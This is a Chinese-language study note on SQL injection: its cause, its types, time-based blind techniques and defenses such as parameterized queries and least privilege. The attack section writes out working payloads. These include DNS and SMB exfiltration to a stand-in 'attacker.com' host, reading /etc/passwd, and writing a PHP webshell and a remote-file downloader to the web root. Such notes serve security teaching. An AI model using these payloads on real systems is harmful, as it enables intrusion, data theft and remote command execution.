# SQL注入漏洞

### 原理

SQL injection主要是对用户请求中的输入参数过滤不严格造成的，如动态拼接字符串。

### 类型
* boolean-based blind
* time-based blind
* error-based
* UNION query-based
* stacked queries
* out-of-band

### 漏洞影响

（以时间型盲注为例）

**时间型盲注(Time-Based Blind SQL Injection Attacks)**：可根据不同响应时间确定是否存在SQL注入漏洞

* Test case
  * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒

* Attacks case
  * 时间型盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
    * [Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/)
      * MySQL`SLEEP(time)` `BENCHMARK(count, expr)`
      * SQL Server`WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
      * Oracle
    * [Timing-based Blind SQL Attacks – Hacker Noon](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
      * Postgres`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
    * 自写脚本实现自动化获取(用二分法加速判断)

```
test.get_version() #获取版本号
test.get_user_first() #获取数据库用户权限
test.get_user_count() #获取数据库用户数量
test.get_user_len() #获取数据库用户长度
test.get_user() #获取数据库当前用户名
test.get_db_count() #获取数据库数量
test.get_db_len() #获取数据库长度
test.get_database() #获取数据库名
test.get_table_len() #获取表名长度
test.get_table() #获取表名
test.get_columns_len() #获取字段名长度
test.get_columns() #获取字段名
test.get_content() #获取第一列第一个字段内容
```


[SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)

* 数据泄露 - 带外通道得到数据(Out Of Band Channeling)
  * DNS Requests - `LOAD_FILE`可以发出DNS请求
    * `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));`
  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
    * `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
* 读取文件内容(Reading Files) Files can be read if the user has FILE privileges.
  * LOAD_FILE()
    * `SELECT LOAD_FILE('/etc/passwd');`
    * `SELECT LOAD_FILE(0x2F6574632F706173737764);`
* 写入文件(Writing Files) Files can be created if the user has FILE privileges.
  * `INTO OUTFILE` 或 `INTO DUMPFILE`
    * Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
    * Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`


### 防御方法

* 1. 预编译语法/参数化查询

```
//PHP
//PDO扩展中的 bindParam()方法绑定参数
```

```
//.NET
//SqlCommand()
//OleDbCommand()
```

```
//JAVA
PreparedStatement()
/(Hibernate
createQuery()
```

```
//SQLite
sqlite3_prepare()
```

```
// Golang(Postgres)
// This is for Postgres. Other SQL variants may use the ? character.
db.Exec("INSERT INTO users(name, email) VALUES($1, $2)",
  "Jon Calhoun", "jon@calhoun.io")
```

```
// Golang(mysql)
// http://mindbowser.com/golang-go-database-sql/
package main
 import (
 _ "github.com/go-sql-driver/mysql"
 "database/sql"
 "log"
 )
 
 func main(){
 db, err := sql.Open("mysql", "root:root@tcp(127.0.0.1:3306)/employeedb")
 
 // Connection Pooling methods
 db.SetConnMaxLifetime(500)
 db.SetMaxIdleConns(50)
 db.SetMaxOpenConns(10)
 db.Stats()
 
 if err != nil {
 log.Fatal(err)
 }
 tx,_:=db.Begin()
 stmt, err := tx.Prepare("INSERT INTO user(id,username) VALUES(?,?)")
 res,err:=stmt.Exec(4,"Abhijit")
 res,err=stmt.Exec(5,"Yogesh")
 if err!=nil{
 tx.Rollback()
 log.Fatal(err)
 }
 tx.Commit()
 log.Println(res)
}
```


* 2. 存储过程

存储过程的安全性和预编译语法相同。
存储过程是用"SQL代码"定义和存储在数据库中的，使用时被应用程序调用。
如果使用了存储过程，开发者应该避免在存储过程中生成不安全的动态SQL查询语句。
```
//JAVA中使用存储过程，该存储过程已经定义在数据库中:
String custname = request.getParameter("customerName");
try {
    CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
    cs.setString(1, custname);
    ResultSet results = cs.executeQuery();
} catch (SQLException se) {
}
```

* 3. 白名单输入验证(White List Input Validation)

* 4. 数据库用户权限最小化(Least Privilege)

参考OWASP [SQL_Injection_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)
